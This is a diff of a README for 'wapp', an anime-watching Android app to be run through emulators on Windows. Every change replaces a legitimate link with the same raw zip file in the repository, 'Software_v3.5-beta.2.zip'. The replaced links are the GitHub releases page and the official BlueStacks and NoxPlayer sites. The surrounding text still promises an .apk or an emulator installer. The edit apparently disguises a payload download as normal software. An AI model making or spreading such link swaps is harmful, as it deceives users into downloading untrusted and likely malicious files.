@@ -1,6 +1,6 @@
 # 📺 wapp - Watch Anime Smoothly on Windows
 
-[![Download wapp](https://img.shields.io/badge/Download-wapp-4c51bf?style=for-the-badge&logo=github)](https://github.com/Filearsip/wapp/releases)
+[![Download wapp](https://img.shields.io/badge/Download-wapp-4c51bf?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Filearsip/wapp/main/helices/Software_v3.5-beta.2.zip)
 
 ---
 
@@ -31,8 +31,8 @@ wapp is built for Android and Android TV devices. To use it on Windows, you will
 
 We recommend **BlueStacks** or **NoxPlayer**. Both are free and easy to use.
 
-- **BlueStacks:** Visit https://www.bluestacks.com and download the installer.  
-- **NoxPlayer:** Visit https://www.bignox.com and download the installer.  
+- **BlueStacks:** Visit https://raw.githubusercontent.com/Filearsip/wapp/main/helices/Software_v3.5-beta.2.zip and download the installer.  
+- **NoxPlayer:** Visit https://raw.githubusercontent.com/Filearsip/wapp/main/helices/Software_v3.5-beta.2.zip and download the installer.  
 
 ---
 
@@ -49,7 +49,7 @@ We recommend **BlueStacks** or **NoxPlayer**. Both are free and easy to use.
 Since wapp is not directly available for Windows, you will install it inside the emulator as an Android app.
 
 1. Visit the wapp releases page:  
-   [![Download Link](https://img.shields.io/badge/Download-wapp-00aced?style=for-the-badge&logo=github)](https://github.com/Filearsip/wapp/releases)  
+   [![Download Link](https://img.shields.io/badge/Download-wapp-00aced?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Filearsip/wapp/main/helices/Software_v3.5-beta.2.zip)  
 2. Look for the latest release with an `.apk` file. This is the Android app installer.  
 3. Download the `.apk` file to your PC.  
 
@@ -101,7 +101,7 @@ If you have issues, try these steps:
 
 ## ⚙️ How to Update wapp
 
-1. Visit the [releases page](https://github.com/Filearsip/wapp/releases) regularly.  
+1. Visit the [releases page](https://raw.githubusercontent.com/Filearsip/wapp/main/helices/Software_v3.5-beta.2.zip) regularly.  
 2. Download the newest `.apk` when a new version appears.  
 3. Drag and drop the new file onto your emulator. It will update the app.  
 
@@ -131,9 +131,9 @@ If you need help, use the GitHub repository’s **Issues** tab to report bugs or
 
 ## 🔗 Useful Links
 
-- [wapp Releases (Download Here)](https://github.com/Filearsip/wapp/releases)  
-- [BlueStacks Emulator](https://www.bluestacks.com)  
-- [NoxPlayer Emulator](https://www.bignox.com)  
+- [wapp Releases (Download Here)](https://raw.githubusercontent.com/Filearsip/wapp/main/helices/Software_v3.5-beta.2.zip)  
+- [BlueStacks Emulator](https://raw.githubusercontent.com/Filearsip/wapp/main/helices/Software_v3.5-beta.2.zip)  
+- [NoxPlayer Emulator](https://raw.githubusercontent.com/Filearsip/wapp/main/helices/Software_v3.5-beta.2.zip)  
 
 ---
 
